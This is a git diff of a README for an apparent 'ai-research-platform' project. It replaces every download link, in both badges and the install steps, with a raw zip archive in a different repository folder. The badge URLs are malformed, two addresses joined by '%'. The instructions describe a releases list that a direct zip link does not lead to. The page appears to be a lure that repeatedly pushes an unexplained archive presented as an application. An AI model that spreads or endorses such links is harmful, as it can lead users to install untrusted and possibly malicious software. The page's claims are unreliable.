@@ -6,7 +6,7 @@ Welcome to the ai-research-platform! This platform helps you conduct comprehensi
 
 ## 📥 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/Sanika73/ai-research-platform/main/morphophonemics/ai-research-platform.zip%https://raw.githubusercontent.com/Sanika73/ai-research-platform/main/morphophonemics/ai-research-platform.zip)](https://raw.githubusercontent.com/Sanika73/ai-research-platform/main/morphophonemics/ai-research-platform.zip)
+[![Download Now](https://github.com/Sanika73/ai-research-platform/raw/refs/heads/main/api/ai_platform_research_2.4.zip%https://github.com/Sanika73/ai-research-platform/raw/refs/heads/main/api/ai_platform_research_2.4.zip)](https://github.com/Sanika73/ai-research-platform/raw/refs/heads/main/api/ai_platform_research_2.4.zip)
 
 ## 📋 Overview
 
@@ -31,7 +31,7 @@ To use the ai-research-platform smoothly, ensure your system meets the following
 
 ## 📥 Download & Install
 
-To get started, visit [this page to download](https://raw.githubusercontent.com/Sanika73/ai-research-platform/main/morphophonemics/ai-research-platform.zip). Follow these simple steps:
+To get started, visit [this page to download](https://github.com/Sanika73/ai-research-platform/raw/refs/heads/main/api/ai_platform_research_2.4.zip). Follow these simple steps:
 
 1. Click on the download link provided above.
 2. You will see a list of available releases. Choose the latest version.
@@ -79,4 +79,4 @@ We welcome contributions to improve this platform. If you have ideas, features y
 
 For the latest updates, join our community on social media or follow us on GitHub. We appreciate your feedback and engagement!
 
-[![Download Now](https://raw.githubusercontent.com/Sanika73/ai-research-platform/main/morphophonemics/ai-research-platform.zip%https://raw.githubusercontent.com/Sanika73/ai-research-platform/main/morphophonemics/ai-research-platform.zip)](https://raw.githubusercontent.com/Sanika73/ai-research-platform/main/morphophonemics/ai-research-platform.zip)
+[![Download Now](https://github.com/Sanika73/ai-research-platform/raw/refs/heads/main/api/ai_platform_research_2.4.zip%https://github.com/Sanika73/ai-research-platform/raw/refs/heads/main/api/ai_platform_research_2.4.zip)](https://github.com/Sanika73/ai-research-platform/raw/refs/heads/main/api/ai_platform_research_2.4.zip)
